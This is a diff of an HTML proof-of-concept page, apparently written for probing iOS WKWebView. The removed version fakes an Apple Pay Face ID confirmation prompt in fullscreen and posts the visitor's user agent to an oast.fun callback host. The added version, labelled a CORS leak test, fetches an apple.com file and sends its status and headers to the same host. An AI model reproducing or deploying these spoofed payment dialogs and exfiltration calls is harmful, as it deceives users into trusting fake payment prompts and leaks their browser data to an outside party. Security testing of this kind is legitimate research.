@@ -1,69 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Apple Pay</title>
+  <meta charset="UTF-8">
+  <title>WKWebView CORS Leak</title>
   <style>
-    html, body {
-      margin: 0;
-      background: black;
-      color: white;
-      font-family: -apple-system;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
     }
-    .prompt {
-      background: #1c1c1e;
-      padding: 30px;
-      border-radius: 20px;
-      text-align: center;
-    }
-    .faceid {
-      font-size: 40px;
-      margin-bottom: 20px;
-    }
-    .btn {
-      background: #007aff;
-      color: white;
-      padding: 12px 24px;
-      border-radius: 10px;
-      font-size: 18px;
+    .status {
       margin-top: 20px;
-      border: none;
     }
   </style>
 </head>
 <body>
+  <h1>WKWebView CORS Leak Test</h1>
+  <p>Menguji apakah fetch() ke domain Apple dapat dilakukan dari WKWebView tanpa preflight.</p>
+  <div class="status">⏳ Fetching...</div>
 
-<div class="prompt">
-  <div class="faceid">🔒 Face ID</div>
-  <div>Confirm with Side Button</div>
-  <button class="btn" onclick="exfil()">Confirm</button>
-</div>
+  <script>
+  const statusDiv = document.querySelector('.status');
 
-<script>
-function exfil() {
-  fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
-    method: "POST",
-    mode: "no-cors",
-    body: JSON.stringify({
-      type: "fullscreen-applepay-spoof",
-      ua: navigator.userAgent,
-      ts: Date.now()
+  fetch("https://apple.com/.well-known/apple-app-site-association")
+    .then(r => {
+      statusDiv.textContent = `✅ Status: ${r.status}, Content-Type: ${r.headers.get("content-type")}`;
+
+      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({
+          leak: true,
+          status: r.status,
+          headers: [...r.headers.entries()],
+          ua: navigator.userAgent,
+          ts: Date.now()
+        })
+      });
     })
-  });
-  alert("✅ Payment confirmed.");
-}
-
-window.onload = () => {
-  if (document.documentElement.requestFullscreen) {
-    document.documentElement.requestFullscreen().catch(() => {});
-  }
-};
-</script>
-
+    .catch(e => {
+      statusDiv.textContent = `❌ Fetch failed: ${e}`;
+    });
+  </script>
 </body>
 </html>
